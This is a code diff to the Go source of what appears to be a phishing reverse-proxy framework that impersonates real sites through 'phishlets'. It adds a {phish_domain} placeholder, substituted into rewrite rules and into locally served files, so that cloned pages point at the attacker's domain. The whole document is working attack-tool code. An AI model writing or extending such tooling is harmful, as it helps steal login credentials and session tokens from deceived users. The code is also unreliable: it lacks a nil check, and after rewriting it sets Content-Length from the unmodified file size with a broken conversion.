@@ -1002,6 +1002,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if stringExists(mime, sf.mime) && (!sf.redirect_only || sf.redirect_only && redirect_set) && param_ok {
 									re_s := sf.regexp
 									replace_s := sf.replace
+									phish_domain, _ := p.cfg.GetSiteDomain(pl.Name)
 									phish_hostname, _ := p.replaceHostWithPhished(combineHost(sf.subdomain, sf.domain))
 									phish_sub, _ := p.getPhishSub(phish_hostname)
 									var static_path string = ""
@@ -1015,7 +1016,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									re_s = strings.Replace(re_s, "{basedomain}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									re_s = strings.Replace(re_s, "{hostname_regexp}", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))), -1)
 									re_s = strings.Replace(re_s, "{subdomain_regexp}", regexp.QuoteMeta(sf.subdomain), -1)
-									re_s = strings.Replace(re_s, "{phish_hostname}", regexp.QuoteMeta(phish_hostname), -1)
+									re_s = strings.Replace(re_s, "{phish_domain}", regexp.QuoteMeta(phish_domain), -1)
 									re_s = strings.Replace(re_s, "{domain_regexp}", regexp.QuoteMeta(sf.domain), -1)
 									re_s = strings.Replace(re_s, "{basedomain_regexp}", regexp.QuoteMeta(p.cfg.GetBaseDomain()), -1)
 									replace_s = strings.Replace(replace_s, "{hostname}", phish_hostname, -1)
@@ -1201,7 +1202,13 @@ func (p *HttpProxy) streamLocalFile(req *http.Request, filePath string) (*http.R
 	if err != nil {
 			return req, goproxy.NewResponse(req, contentType, http.StatusInternalServerError, "")
 	}
-	resp := goproxy.NewResponse(req, contentType, http.StatusOK, string(buffer))
+	
+	body := string(buffer)
+	pl := p.getPhishletByPhishHost(req.Host)
+	phish_domain, _ := p.cfg.GetSiteDomain(pl.Name)
+	body = strings.Replace(body, "{phish_domain}", phish_domain, -1)
+
+	resp := goproxy.NewResponse(req, contentType, http.StatusOK, body)
 	resp.Header.Set("Content-Length", string(int32(fileInfo.Size())))
 	return req, resp
 }
